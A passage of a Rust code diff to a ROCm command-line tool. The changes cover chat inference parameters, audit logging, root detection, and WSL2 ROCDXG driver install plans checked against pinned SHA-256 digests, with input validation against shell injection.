+        }) => diagnose(symptom, top, json, distro),
+        // Keep this error chained rather than discarding it into a fresh
+        // `anyhow!(...)` (e.g. via a `.map_err` that restringifies it) -- see
+        // `FixExitCode`'s doc comment for why that would silently break its
+        // exit-code-carrying downcast. `.context(...)` is fine.
         Some(Command::Fix {
             fix_id,
             yes,
             dry_run,
             device_index,
         }) => fix(fix_id, yes, dry_run, device_index),
-        Some(Command::Version) => {
-            println!("rocm {}", env!("CARGO_PKG_VERSION"));
-            Ok(())
-        }
+        Some(Command::Version) => version(),
         Some(Command::Setup { command }) => setup(command),
         Some(Command::EngineServeHttp {
             engine,
@@ -1679,6 +2113,9 @@ fn dispatch(cli: Cli) -> Result<()> {
             provider,
             model,
             prompt,
+            temperature,
+            top_p,
+            max_tokens,
             tools,
             chat_mock,
         }) => {
@@ -1696,8 +2133,27 @@ fn dispatch(cli: Cli) -> Result<()> {
                         "note: launching the dash chat; switch providers with /provider <name>"
                     );
                 }
-                return dash::run_chat(chat_mock);
+                return dash::run_chat(
+                    chat_mock,
+                    ChatInferenceParams {
+                        temperature,
+                        top_p,
+                        max_tokens,
+                    },
+                );
             }
+            // Resolve the prompt from `--prompt` or, when it is omitted and
+            // stdin is not a terminal, from piped standard input — the
+            // documented `echo "…" | rocm chat` path. Only when neither
+            // supplies a prompt do we fall back to the status screen, which
+            // two kinds of invocation reach: stdin is a TTY that the
+            // interactive branch above declined (it also requires stdout to be
+            // one), or stdin was redirected and carried nothing but whitespace
+            // — an empty pipe or `< /dev/null`.
+            let prompt = match prompt {
+                Some(prompt) => Some(prompt),
+                None => read_piped_prompt()?,
+            };
             match prompt {
                 Some(prompt) => print!(
                     "{}",
@@ -1706,7 +2162,12 @@ fn dispatch(cli: Cli) -> Result<()> {
                         provider.map_or("local", provider_name),
                         model.as_deref(),
                         &prompt,
-                        tools
+                        tools,
+                        ChatInferenceParams {
+                            temperature,
+                            top_p,
+                            max_tokens,
+                        },
                     )?
                 ),
                 None => print!(
@@ -1723,9 +2184,18 @@ fn dispatch(cli: Cli) -> Result<()> {
             runtime,
             activate,
             dry_run,
+            yes: _,
+            json,
+            timeout_secs,
         }) => {
             let paths = AppPaths::discover()?;
-            if apply {
+            if !apply && !dry_run && (runtime.is_some() || activate) {
+                bail!(
+                    "--runtime and --activate require --apply or --dry-run; \
+                     run `rocm update --dry-run` to preview or add --apply to update"
+                );
+            }
+            if update_should_preview_or_apply(apply, dry_run) {
                 let mut config = RocmCliConfig::load(&paths)?;
                 match apply_runtime_update(
                     &paths,
@@ -1770,6 +2240,33 @@ fn dispatch(cli: Cli) -> Result<()> {
                                 activate,
                                 dry_run
                             ),
+                            None,
+                        );
+                        return Err(error);
+                    }
+                }
+                return Ok(());
+            }
+            if json {
+                match therock::render_update_json(&paths, timeout_secs) {
+                    Ok(document) => {
+                        println!("{}", serde_json::to_string(&document)?);
+                        record_cli_audit_event(
+                            &paths,
+                            "update",
+                            "update_check",
+                            "info",
+                            "rendered update report (json)",
+                            None,
+                        );
+                    }
+                    Err(error) => {
+                        record_cli_audit_event(
+                            &paths,
+                            "update",
+                            "update_check",
+                            "error",
+                            format!("update report failed: {error}"),
                             None,
                         );
                         return Err(error);
@@ -1832,6 +2329,9 @@ fn dispatch(cli: Cli) -> Result<()> {
             allow_public_bind,
             tool_call_parser,
             gpu_memory_utilization,
+            temperature,
+            top_p,
+            max_tokens,
             api_key,
         }) => serve(ServeArgs {
             model,
@@ -1849,6 +2349,9 @@ fn dispatch(cli: Cli) -> Result<()> {
             allow_public_bind,
             tool_call_parser,
             gpu_memory_utilization,
+            temperature,
+            top_p,
+            max_tokens,
             api_key,
         }),
         Some(Command::Comfyui { command }) => comfyui(command),
@@ -1995,6 +2498,9 @@ fn strip_subcommands(cmd: clap::Command) -> clap::Command {
     if let Some(long_version) = cmd.get_long_version() {
         bare = bare.long_version(long_version.to_owned());
     }
+    if let Some(display_name) = cmd.get_display_name() {
+        bare = bare.display_name(display_name.to_owned());
+    }
     for alias in cmd.get_visible_aliases() {
         bare = bare.visible_alias(alias.to_owned());
     }
@@ -2115,6 +2621,11 @@ struct ExamineJsonSummary<'a> {
     active_runtime_id: Option<&'a str>,
     active_runtime_key: Option<&'a str>,
     previous_runtime_key: Option<&'a str>,
+    /// Where the active runtime lives, completing the `id`/`key`/`root` triple.
+    /// Not derivable from the key: `install_root` is its own field on the
+    /// manifest, and `install sdk --prefix`, `runtimes adopt` and `runtimes
+    /// import` all set it freely.
+    active_runtime_root: Option<String>,
 }
 
 fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
@@ -2125,13 +2636,24 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
     let paths = AppPaths::discover()?;
     let config = RocmCliConfig::load(&paths).unwrap_or_default();
     if json {
-        let examination = rocm_core::Examination::probe(framework);
+        // Prefer the active runtime's interpreter: in the managed configuration
+        // torch lives only in its site-packages, so probing PATH would report
+        // `unknown` for a host that has one.
+        let interpreter = rocm_core::active_managed_framework_interpreter(&paths, &config);
+        let examination =
+            rocm_core::Examination::probe_with_interpreter(framework, interpreter.as_ref());
         // `gather` rather than `examine_human_report`: the latter first runs
         // `recover_setup_runtime_registration`, which writes. Asking a machine a
         // question should not change it, and `--json` is the form tooling calls
         // in a loop.
         let host = ExamineSummary::gather()?;
         let configured_default_engine = config.default_engine.as_deref();
+        // Same resolution the human report uses, minus the recovery write above:
+        // an unreadable registry leaves the root `null` rather than failing the
+        // inspection, which is the weaker answer but still an answer.
+        let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+        let active_runtime_root = current_runtime_manifest(&config, &manifests)
+            .map(|manifest| manifest.install_root.display().to_string());
         let document = ExamineJson {
             examination: &examination,
             summary: ExamineJsonSummary {
@@ -2140,6 +2662,7 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
                 active_runtime_id: config.default_runtime_id.as_deref(),
                 active_runtime_key: config.active_runtime_key.as_deref(),
                 previous_runtime_key: config.previous_runtime_key.as_deref(),
+                active_runtime_root,
                 host: &host,
             },
         };
@@ -2149,23 +2672,62 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
     let (text, summary) = examine_human_report(&paths, &config)?;
     print!("{text}");
     if summary.wsl.as_ref().is_some_and(|w| w.is_wsl) {
-        // Informational route-out guidance for humans (the verdict is also in
+        // Informational platform guidance for humans (the verdict is also in
         // the `status` field for `--json` consumers).
-        println!("\n{}", rocm_core::WSL_ROUTE_OUT_NOTE);
+        println!("\n{}", rocm_core::WSL_PLATFORM_NOTE);
     }
     Ok(())
 }
 
-fn diagnose(symptom: Option<String>, top: usize, json: bool) -> Result<()> {
+fn diagnose(symptom: Option<String>, top: usize, json: bool, distro: Option<String>) -> Result<()> {
     // `rocm diagnose` is a query: it exits 0 whether it matched, found nothing,
     // or is out of scope. Callers read `has_match` / `out_of_scope` /
     // `route_when_no_match` from `--json` rather than branching on the exit code.
-    let examination = rocm_core::Examination::probe(rocm_core::FrameworkProbe::Auto);
+    //
+    // `--distro` is the exception that still errors: the user named a machine to
+    // inspect, and silently reporting on a different one would be worse than
+    // failing. `--distro` with no value means "the only one installed".
+    let examination = if let Some(name) = distro {
+        let selected = (!name.is_empty()).then_some(name);
+        rocm_core::probe_wsl_distro_from_host(selected.as_deref())
+            .map_err(|reason| anyhow::anyhow!("{reason}"))?
+    } else {
+        // Same reasoning as `examine --json`: the catalog reasons over the torch
+        // the engines will load, which is the active runtime's.
+        //
+        // Best-effort, unlike `examine`'s copy: this command already promises to
+        // answer on a degraded host, so a path-discovery failure must cost only
+        // the managed-runtime lookup, never the diagnosis.
+        let interpreter = AppPaths::discover().ok().and_then(|paths| {
+            let config = RocmCliConfig::load(&paths).unwrap_or_default();
+            rocm_core::active_managed_framework_interpreter(&paths, &config)
+        });
+        rocm_core::Examination::probe_with_interpreter(
+            rocm_core::FrameworkProbe::Auto,
+            interpreter.as_ref(),
+        )
+    };
+    let inspected_remotely = examination
+        .wsl
+        .as_ref()
+        .is_some_and(|wsl| !wsl.locally_probed);
     let report = rocm_core::run_diagnose(&examination, &symptom.unwrap_or_default());
     if json {
         println!("{}", serde_json::to_string_pretty(&report)?);
     } else {
         print!("{}", rocm_core::render_diagnose_text(&report, top));
+        // Inspecting a distribution from outside it collects no environment, so
+        // the checks that read one never run. Without saying so, "no known
+        // misconfiguration matched" reads as a clean bill of health for the
+        // whole installation, when it only covers the WSL GPU stack.
+        if inspected_remotely {
+            println!(
+                "\nNote: inspected from outside the distribution, which sees only its \
+                 WSL GPU stack.\nChecks that read the environment (HSA_OVERRIDE_GFX_VERSION, \
+                 PATH, the framework/ROCm pairing)\ndid not run. For those, run `rocm diagnose` \
+                 inside the distribution."
+            );
+        }
     }
     Ok(())
 }
@@ -2182,7 +2744,7 @@ fn fix(fix_id: Option<String>, yes: bool, dry_run: bool, device_index: Option<i6
     };
     let code = rocm_core::apply_fix(&fix_id, &opts);
     if code != 0 {
-        std::process::exit(code);
+        return Err(FixExitCode(code).into());
     }
     Ok(())
 }
@@ -2325,7 +2887,9 @@ fn install(target: InstallTarget) -> Result<()> {
             family,
             dry_run,
             yes,
+            approve_replacing_active_default,
         } => {
+            let consents = SdkInstallConsents::resolve(yes, approve_replacing_active_default);
             let format_name = match format {
                 InstallFormat::Wheel => "wheel",
                 InstallFormat::Tarball => "tarball",
@@ -2346,58 +2910,56 @@ fn install(target: InstallTarget) -> Result<()> {
                 version_selector,
                 family.as_deref(),
                 dry_run,
+                consents.replace_active_default,
             ) {
-                Ok(output) => {
-                    let finalized = if dry_run {
-                        None
-                    } else {
+                Ok(result) => {
+                    let therock::SdkInstallResult { output, mutated } = result;
+                    let finalized = if mutated {
                         finalize_successful_sdk_install(&paths)?
+                    } else {
+                        None
                     };
                     print!("{output}");
-                    if let Some(finalized) = finalized {
-                        print_sdk_install_success(&finalized);
+                    if let Some(finalized) = &finalized {
+                        print_sdk_install_success(finalized);
                         // The SDK runtime wheel bundles PyTorch, whose ROCm build
                         // links against libatomic.so.1 and the system numactl
                         // runtime (libnuma.so.1 / libnuma_1.2). Ensure both are
                         // present for every SDK install, independent of which
                         // engine (if any) is auto-installed below.
-                        ensure_libatomic_for_torch(yes);
-                        ensure_libnuma_for_torch(yes);
-                        if let Err(error) =
-                            maybe_auto_install_sdk_preferred_engine(&paths, &finalized, yes)
-                        {
-                            record_cli_audit_event(
-                                &paths,
-                                "engine",
-                                "engine_auto_install",
-                                "error",
-                                format!(
-                                    "auto-install failed engine=vllm runtime_id={} family={}: {error}",
-                                    finalized.runtime_key, finalized.family
-                                ),
-                                None,
-                            );
-                            eprintln!("warning: automatic vLLM install failed: {error}");
-                            eprintln!(
-                                "warning: SDK install completed; you can run `rocm engines install vllm --runtime-id {}` after vLLM is available in that runtime",
-                                finalized.runtime_key
-                            );
-                        }
+                        ensure_libatomic_for_torch(consents.system_packages);
+                        ensure_libnuma_for_torch(consents.system_packages);
                     }
-                    record_cli_audit_event(
+                    finish_sdk_install(
                         &paths,
-                        "runtime",
+                        finalized.as_ref(),
                         if dry_run {
                             "install_sdk_dry_run"
                         } else {
                             "install_sdk"
                         },
-                        "info",
-                        format!(
-                            "sdk install completed channel={channel} format={format_name} prefix={prefix_display} version_selector={version_selector_display} dry_run={dry_run}"
-                        ),
-                        None,
-                    );
+                        {
+                            // A real install that did not mutate the system was
+                            // declined at the approval prompt; recording it as
+                            // "completed" would lie in the audit trail. Dry-run
+                            // never mutates but legitimately completes a preview.
+                            let status = if dry_run || mutated {
+                                "completed"
+                            } else {
+                                "cancelled"
+                            };
+                            format!(
+                                "sdk install {status} channel={channel} format={format_name} prefix={prefix_display} version_selector={version_selector_display} dry_run={dry_run}"
+                            )
+                        },
+                        |paths, finalized| {
+                            maybe_auto_install_sdk_preferred_engine(
+                                paths,
+                                finalized,
+                                consents.system_packages,
+                            )
+                        },
+                    )?;
                 }
                 Err(error) => {
                     record_cli_audit_event(
@@ -2506,7 +3068,10 @@ fn install_driver(
     let examine =
         ExamineSummary::gather().map_err(|source| DriverInstallError::new(source, false))?;
     let os_release = read_os_release().unwrap_or_default();
-    let plan = build_driver_install_plan(&examine, &os_release, dkms);
+    // The only place the real privilege level is read; every builder below takes
+    // it as a parameter so both branches stay testable on any host.
+    let plan =
+        build_driver_install_plan(&examine, &os_release, dkms, PrivilegeEscalation::detect());
     let mut output = render_driver_install_plan(&plan, yes, dry_run);
     if !yes || dry_run || !plan.supported || !plan.mutating {
         return Ok(DriverInstallResult {
@@ -2522,7 +3087,7 @@ fn install_driver(
         pre_driver: examine.driver,
         post_driver: None,
         boot_id_at_execution: boot_id,
-        reboot_required: false,
+        reboot_required: plan.reboot_required,
         reboot_observed: false,
         commands: plan.execution_commands(),
         reconciled_at_unix_ms: None,
@@ -2531,40 +3096,54 @@ fn install_driver(
     write_driver_install_state(paths, &state)
         .map_err(|source| DriverInstallError::new(source, false))?;
 
-    for command in &plan.commands {
-        if !matches!(
-            command.phase,
-            DriverCommandPhase::Prepare | DriverCommandPhase::Execute
-        ) {
-            continue;
-        }
-        run_driver_shell_command(&command.command)
-            .with_context(|| format!("driver command failed: {}", command.command))
-            .map_err(|source| DriverInstallError::new(source, true))?;
-    }
+    execute_driver_install_plan(
+        &plan,
+        &mut state,
+        run_driver_shell_command,
+        |state| write_driver_install_state(paths, state),
+        || ExamineSummary::gather().map(|summary| summary.driver),
+    )
+    .map_err(|source| DriverInstallError::new(source, true))?;
 
-    let post_driver = ExamineSummary::gather()
-        .map_err(|source| DriverInstallError::new(source, true))?
-        .driver;
-    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
-    state.post_driver = Some(post_driver);
-    state.reboot_required = true;
-    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
-    write_driver_install_state(paths, &state)
-        .map_err(|source| DriverInstallError::new(source, true))?;
-
-    let _ = writeln!(output, "execution:");
-    let _ = writeln!(output, "  status: completed");
-    let _ = writeln!(output, "  reboot_required: true");
-    let _ = writeln!(
-        output,
-        "  state: {}",
-        driver_install_state_path(paths).display()
-    );
+    let report = cli_report::ActionReport::new("driver install completed")
+        .detail("reboot_required", plan.reboot_required)
+        .detail("state", driver_install_state_path(paths).display());
+    output.push_str(&report.render());
     Ok(DriverInstallResult {
         output,
         executed: true,
     })
+}
+
+fn execute_driver_install_plan<Run, Persist, Gather>(
+    plan: &DriverInstallPlan,
+    state: &mut DriverInstallState,
+    mut run: Run,
+    mut persist: Persist,
+    gather_post_driver: Gather,
+) -> Result<()>
+where
+    Run: FnMut(&str) -> Result<()>,
+    Persist: FnMut(&DriverInstallState) -> Result<()>,
+    Gather: FnOnce() -> Result<rocm_core::DriverSummary>,
+{
+    for command in &plan.commands {
+        if plan.reboot_required && command.phase == DriverCommandPhase::Verify {
+            continue;
+        }
+        run(&command.command)
+            .with_context(|| format!("driver command failed: {}", command.command))?;
+    }
+
+    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
+    state.reboot_required = plan.reboot_required;
+    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
+    persist(state)?;
+
+    let post_driver = gather_post_driver()?;
+    state.post_driver = Some(post_driver);
+    persist(state)?;
+    Ok(())
 }
 
 fn reconcile_driver_install(paths: &AppPaths) -> Result<String> {
@@ -2603,7 +3182,6 @@ fn reconcile_driver_install_state(
         .zip(current_boot_id.as_deref())
         .is_some_and(|(executed, current)| executed != current);
     state.reboot_observed = reboot_observed;
-    state.reboot_required = state.reboot_required || state.executed_at_unix_ms.is_some();
     state.post_driver = Some(driver.clone());
     let at_unix_ms = rocm_core::unix_time_millis();
     state.reconciled_at_unix_ms = Some(at_unix_ms);
@@ -2781,11 +3359,18 @@ struct DriverInstallPlan {
     os_id: String,
     version_id: String,
     codename: String,
-    repo_version_expr: String,
+    repo_version: String,
     reason: String,
     preflight_checks: Vec<String>,
     commands: Vec<DriverPlanCommand>,
     checks: Vec<String>,
+    /// Whether the host must reboot before the verification steps mean anything.
+    ///
+    /// True for the kernel-module paths: an amdgpu DKMS build is not live until
+    /// the machine comes back up. False on WSL2, where nothing kernel-side
+    /// changes — ROCDXG is a userspace library and `ldconfig` publishes it
+    /// immediately, so telling the user to reboot would be wrong.
+    reboot_required: bool,
 }
 
 impl DriverInstallPlan {
@@ -2814,6 +3399,58 @@ enum DriverCommandPhase {
 struct DriverPlanCommand {
     phase: DriverCommandPhase,
     command: String,
+}
+
+/// How a generated driver command is expected to reach root.
+///
+/// The driver plan is a list of shell lines, so escalation is a text prefix
+/// rather than an argv decision (contrast `openmpi::InstallCommand`, whose
+/// commands are argv vectors and can prepend `sudo` structurally). Prefixing
+/// unconditionally is what made `install driver` unusable on the hosts it is
+/// most needed on: containers and minimal cloud images run as uid 0 with no
+/// `sudo` binary, so every command died with `sudo: not found` before any
+/// driver work happened.
+///
+/// This is resolved when the plan is BUILT, not when it runs, so that the plan
+/// `--dry-run` prints, the plan the approval prompt shows, and the commands
+/// persisted into `state.json` are all the commands that actually execute.
+#[derive(Debug, Clone, Copy, Eq, PartialEq)]
+enum PrivilegeEscalation {
+    /// Not root: privileged commands need a `sudo` prefix.
+    Sudo,
+    /// Already uid 0: `sudo` is unnecessary, and may not even be installed.
+    AlreadyRoot,
+}
+
+impl PrivilegeEscalation {
+    /// Read the current process's privilege level.
+    ///
+    /// Only ever called on the production path; every plan builder takes the
+    /// escalation as a parameter so both branches are testable on any host.
+    fn detect() -> Self {
+        if rocm_core::openmpi::running_as_root() {
+            Self::AlreadyRoot
+        } else {
+            Self::Sudo
+        }
+    }
+
+    /// The prefix to place before a command that must run as root — `"sudo "`,
+    /// or nothing at all when the process already is root. Includes the
+    /// trailing space so it composes directly into a command string.
+    const fn prefix(self) -> &'static str {
+        match self {
+            Self::Sudo => "sudo ",
+            Self::AlreadyRoot => "",
+        }
+    }
+
+    /// Whether a plan built under this escalation depends on `sudo` being
+    /// installed. Drives the preflight list, so it does not claim a
+    /// precondition the plan is not relying on.
+    const fn needs_sudo_binary(self) -> bool {
+        matches!(self, Self::Sudo)
+    }
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -2856,12 +3493,360 @@ struct DriverPassiveCheck {
     detail: String,
 }
 
+/// Release of ROCDXG installed on WSL2, overridable for trying another build.
+///
+/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
+/// same way `ROCM_CLI_AMDGPU_VERSION` is handled for the bare-metal repository
+/// pin. The concrete value is baked into the archive name, the release URL and
+/// the `repo_version:` line, so the plan a user reviews names the build the
+/// install will actually fetch rather than an unexpanded `${...}` placeholder.
+///
+/// How the default is chosen: the newest non-prerelease `librocdxg` release
+/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
+/// is two edits — add the `(version, digest)` row to that table, then change
+/// the literal here — and the two must move together: a default with no row
+/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
+/// the caller supplies a digest, so a bump that forgets the table breaks every
+/// default WSL install rather than falling back to the previous release.
+///
+/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
+/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
+/// them do not, is not installed here. It is a second prefix under
+/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
+/// installs an `/etc/profile.d` entry that sources the package's own
+/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
+/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
+/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
+/// nor `rocm serve` depends on, and it is not available for every version in
+/// the pinned table. Installing it is a separate decision that belongs behind
+/// its own opt-in, not folded into the plan whose job is to supply the runtime
+/// bridge.
+const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";
+
+/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
+/// Required when installing a version this build has no digest for.
+const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";
+
+/// Opts out of digest verification entirely, when set to an affirmative value.
+/// Named explicitly so that shipping an unverified root install is a deliberate
+/// act with an audit trail in the plan, rather than what happens when a variable
+/// is simply unset.
+const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";
+
+/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
+/// ROCDXG release, taken from the release host's own asset metadata.
+///
+/// These exist so the default install is authenticated. The package is fetched
+/// over plain HTTPS from a release page and then handed to `apt-get install`,
+/// which runs its maintainer scripts as root — so without a digest, TLS to the
+/// download host is the only thing standing between a compromised or swapped
+/// artifact and root on the user's machine. That is materially weaker than the
+/// bare-metal apt path in this same file, which installs from a repository
+/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
+///
+/// A version absent from this table is not installed unless the caller supplies
+/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
+/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
+/// Add the new pair here when pinning a newer release. Nothing in the tree
+/// checks a row against the published artifact, so a mistyped digest surfaces
+/// only as a failed install on a WSL host — fail-closed, but confusing. Take
+/// the value from the release's own asset metadata, or recompute it:
+///
+/// ```text
+/// curl -L --fail \
+///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
+///   | sha256sum
+/// ```
+const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
+    (
+        "1.0.0",
+        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
+    ),
+    (
+        "1.1.0",
+        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
+    ),
+    (
+        "1.1.1",
+        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
+    ),
+    (
+        "1.1.2",
+        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
+    ),
+    (
+        "1.2.0",
+        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
+    ),
+    (
+        "1.2.1",
+        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
+    ),
+    (
+        "1.2.2",
+        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
+    ),
+];
+
+/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
+///
+/// The driver plan is a list of shell lines run through `sh -c`, and the
+/// version is interpolated into three of them — the archive name, the release
+/// URL and the local path — each of which is then executed with `sudo` already
+/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
+/// this unchanged from the environment, so a value containing `;` or a
+/// backtick would otherwise end the intended command and start an attacker's
+/// own. Restricting it to characters that appear in a Debian package version
+/// removes the possibility rather than trying to escape it.
+fn rocdxg_version_is_well_formed(version: &str) -> bool {
+    !version.is_empty()
+        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
+}
+
+/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
+/// form `sha256sum -c -` expects.
+fn sha256_digest_is_well_formed(digest: &str) -> bool {
+    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// How the downloaded ROCDXG package will be authenticated before it is
+/// installed as root.
+#[derive(Debug, Clone, Eq, PartialEq)]
+enum RocdxgVerification {
+    /// Check the download against this digest and abort the install on a
+    /// mismatch.
+    Digest(String),
+    /// Install without checking, because the caller explicitly asked for it.
+    OptedOut,
+}
+
+/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
+/// no plan can be built.
+///
+/// Resolution order — an explicit digest wins over the pinned one so a user can
+/// install an artifact this build predates without having to disable
+/// verification wholesale:
+///
+/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
+/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
+/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
+///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
+///    out. `0` and `false` do not.
+///
+/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
+/// mode of an unset variable is a plan that will not run, not a root install of
+/// an unauthenticated package.
+fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
+    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
+        .ok()
+        .map(|value| value.trim().to_ascii_lowercase())
+        .filter(|value| !value.is_empty())
+    {
+        if !sha256_digest_is_well_formed(&supplied) {
+            return Err(format!(
+                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
+            ));
+        }
+        return Ok(RocdxgVerification::Digest(supplied));
+    }
+
+    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
+        .iter()
+        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
+    {
+        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
+    }
+
+    // An allowlist of affirmative values, not "set to anything non-empty":
+    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
+    // for "off" — would turn digest checking off for a package installed as
+    // root. Anything this does not recognise leaves verification on.
+    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
+        return Ok(RocdxgVerification::OptedOut);
+    }
+
+    Err(format!(
+        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
+    ))
+}
+
+/// A WSL plan that cannot be run, carrying the reason in the same shape every
+/// other unsupported plan uses so `--dry-run`, the approval prompt and
+/// `state.json` all report it identically.
+fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
+    DriverInstallPlan {
+        supported: false,
+        mutating: false,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version,
+        reason,
+        preflight_checks: Vec::new(),
+        commands: Vec::new(),
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        reboot_required: false,
+    }
+}
+
+/// The `rocm install driver` plan for a WSL2 host.
+///
+/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
+/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
+/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
+/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
+/// "no usable AMD GPU detected", even though a gfx target is detected — the
+/// target is read from the Windows-side driver.
+///
+/// This used to be a refusal pointing at a shell script under `scripts/`, which
+/// ships only in a git checkout — never in the release bundle — so it was a dead
+/// end for anyone who installed the CLI normally. These are that script's steps;
+/// it has been removed rather than left as a second, untested copy of them.
+fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
+    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
+    if !rocdxg_version_is_well_formed(&version) {
+        return wsl_rocdxg_refusal_plan(
+            // The rejected value is still rendered into the plan's
+            // `repo_version:` line so the user can see what was refused — but
+            // that line is part of a plan a human reads to decide, and a raw
+            // value containing a newline could forge further lines in it. The
+            // debug form escapes newlines and makes trailing space visible,
+            // which is exactly what is wanted for a value being shown as
+            // rejected.
+            format!("{version:?}"),
+            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
+        );
+    }
+    let verification = match resolve_rocdxg_verification(&version) {
+        Ok(verification) => verification,
+        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
+    };
+
+    let sudo = escalation.prefix();
+    let deb = format!("rocdxg-roct_{version}_amd64.deb");
+    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
+    let deb_path = format!("/tmp/{deb}");
+    // `version` is validated above and the digest is hex, so neither can carry
+    // shell metacharacters; the quotes keep that guarantee local to the command
+    // rather than resting on a check several functions away.
+    let verify_download = match &verification {
+        RocdxgVerification::Digest(digest) => driver_command(
+            DriverCommandPhase::Execute,
+            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
+        ),
+        RocdxgVerification::OptedOut => driver_command(
+            DriverCommandPhase::Execute,
+            &format!(
+                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
+            ),
+        ),
+    };
+    DriverInstallPlan {
+        supported: true,
+        mutating: true,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version: version,
+        reason:
+            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
+                .to_owned(),
+        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
+        // is absent the fix is on the Windows side and no Linux package helps.
+        // The Execute phase fails on the same two paths rather than installing
+        // a library with nothing to bind to.
+        preflight_checks: {
+            let mut checks = vec![
+                "/dev/dxg (WSL GPU device)".to_owned(),
+                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
+            ];
+            checks.extend(driver_root_preflight_checks(escalation));
+            checks
+        },
+        commands: vec![
+            driver_command(
+                DriverCommandPhase::Prepare,
